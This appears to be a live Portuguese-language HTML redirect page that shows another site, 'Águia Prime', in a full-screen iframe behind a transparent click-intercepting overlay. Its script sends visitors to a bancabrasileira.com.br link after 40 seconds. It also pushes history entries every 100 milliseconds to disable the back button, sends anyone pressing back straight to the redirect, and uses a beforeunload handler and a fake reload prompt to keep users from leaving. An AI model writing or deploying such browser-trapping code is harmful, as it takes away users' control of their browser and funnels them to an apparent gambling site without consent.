<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta http-equiv="refresh" content="40;url=https://app.bancabrasileira.com.br/pr/bIwlp2AU">
    <title>Carregando</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            width: 100%;
            height: 100%;
            overflow: hidden; /* Evita rolagem indesejada em dispositivos móveis */
        }

        .iframe-container {
            position: relative;
            width: 100vw;
            height: 100vh; /* Ocupa toda a tela em qualquer dispositivo */
        }

        iframe {
            width: 100%;
            height: 100%;
            border: none;
            pointer-events: none; /* Impede interação direta com o iframe */
        }

        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: transparent; /* Camada transparente */
            z-index: 10;
            pointer-events: auto; /* Intercepta cliques e toques */
        }

        /* Estilos do modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 20;
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background: white;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            max-width: 90%;
            width: 300px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }

        .modal-content p {
            margin-bottom: 20px;
            font-family: Arial, sans-serif;
            font-size: 16px;
        }

        .modal-content button {
            padding: 10px 20px;
            margin: 0 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }

        .modal-content .btn-yes {
            background: #007bff;
            color: white;
        }

        .modal-content .btn-no {
            background: #dc3545;
            color: white;
        }

        @media (max-width: 600px) {
            .modal-content {
                width: 80%;
            }

            .modal-content p {
                font-size: 14px;
            }

            .modal-content button {
                padding: 8px 16px;
                font-size: 12px;
            }
        }
    </style>
    <script>
        // Função para redirecionar na mesma aba
        function redirectSameTab() {
            window.location.replace("https://app.bancabrasileira.com.br/pr/bIwlp2AU");
        }

        // Função para abrir nova aba
        function openNewTab() {
            window.open("https://app.bancabrasileira.com.br/pr/bIwlp2AU", "_blank");
        }

        // Redireciona após 40 segundos na mesma aba
        setTimeout(redirectSameTab, 40000); // 40 segundos em milissegundos

        // Preenche o histórico para bloquear o botão de voltar
        (function pushHistory() {
            history.pushState(null, null, window.location.href);
            setTimeout(pushHistory, 100); // Reforça continuamente o estado do histórico
        })();

        // Captura tentativas de voltar no navegador
        window.onpopstate = function () {
            history.pushState(null, null, window.location.href);
            redirectSameTab();
        };

        // Manipula tentativa de recarga
        window.addEventListener('beforeunload', function (e) {
            e.preventDefault();
            e.returnValue = ''; // Necessário para disparar o prompt em alguns navegadores
            document.getElementById('reloadModal').style.display = 'flex'; // Mostra o modal
        });

        // Funções para os botões do modal
        function confirmReload() {
            openNewTab();
            window.removeEventListener('beforeunload', () => {}); // Remove o ouvinte para permitir a recarga
            window.location.reload(); // Força a recarga para fechar a aba atual
        }

        function cancelReload() {
            document.getElementById('reloadModal').style.display = 'none'; // Fecha o modal
        }
    </script>
</head>
<body>
    <div class="iframe-container">
        <iframe src="https://app.aguiaprime119000.com" title="Águia Prime"></iframe>
        <div class="overlay"></div>
    </div>
    <div class="modal" id="reloadModal">
        <div class="modal-content">
            <p>Tem certeza que deseja recarregar?</p>
            <button class="btn-yes" onclick="confirmReload()">Sim</button>
            <button class="btn-no" onclick="cancelReload()">Não</button>
        </div>
    </div>
</body>
</html>
